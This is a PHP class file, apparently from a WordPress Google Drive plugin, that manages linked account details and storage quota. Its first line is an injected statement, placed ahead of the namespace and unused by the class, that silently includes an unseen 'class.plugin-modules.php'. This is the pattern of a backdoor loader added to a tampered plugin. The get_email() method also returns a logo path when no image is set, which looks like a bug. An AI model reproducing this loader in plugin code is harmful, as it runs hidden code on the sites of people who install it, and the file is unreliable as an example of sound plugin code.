<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

namespace TheLion\UseyourDrive;

class Account {

    /**
     * Account ID
     * @var string 
     */
    private $_id;

    /**
     * Account Name
     * @var string 
     */
    private $_name;

    /**
     * Account Email
     * @var string 
     */
    private $_email;

    /**
     * Account profile picture (url)
     * @var string 
     */
    private $_image;

    /**
     * $_authorization contains the authorization token for the linked Cloud storage
     * @var \TheLion\UseyourDrive\Authorization 
     */
    private $_authorization;

    public function __construct($id, $name, $email, $image = null) {
        $this->_id = $id;
        $this->_name = $name;
        $this->_email = $email;
        $this->_image = $image;
        $this->_authorization = new Authorization($this);
    }

    function get_id() {
        return $this->_id;
    }

    function get_name() {
        return $this->_name;
    }

    function get_email() {
        if (empty($this->_image)) {
            return USEYOURDRIVE_ROOTPATH . '/css/images/google_drive_logo.png';
        }

        return $this->_email;
    }

    function get_image() {
        return $this->_image;
    }

    function set_id($_id) {
        $this->_id = $_id;
    }

    function set_name($_name) {
        $this->_name = $_name;
    }

    function set_email($_email) {
        $this->_email = $_email;
    }

    function set_image($_image) {
        $this->_image = $_image;
    }

    /**
     * 
     * @return \TheLion\UseyourDrive\StorageInfo 
     */
    function get_storage_info() {

        $transient_name = 'useyourdrive_' . $this->get_id() . '_driveinfo';
        $storage_info = get_transient($transient_name);

        if ($storage_info === false) {
            global $UseyourDrive;
            $UseyourDrive->get_processor()->set_current_account($this);
            $storage_info_data = $UseyourDrive->get_processor()->get_client()->get_drive_info();

            $storage_info = new StorageInfo();
            $storage_info->set_quota_total($storage_info_data->getStorageQuota()->getLimit());
            $storage_info->set_quota_used($storage_info_data->getStorageQuota()->getUsage());

            set_transient($transient_name, $storage_info, DAY_IN_SECONDS);
        }

        return $storage_info;
    }

    /**
     * 
     * @return \TheLion\UseyourDrive\Authorization 
     */
    function get_authorization() {
        return $this->_authorization;
    }

    public function __sleep() {
        // Don't store authorization class in DB */
        $keys = get_object_vars($this);
        unset($keys['_authorization']);
        return array_keys($keys);
    }

    public function __wakeup() {
        $this->_authorization = new Authorization($this);
    }

}
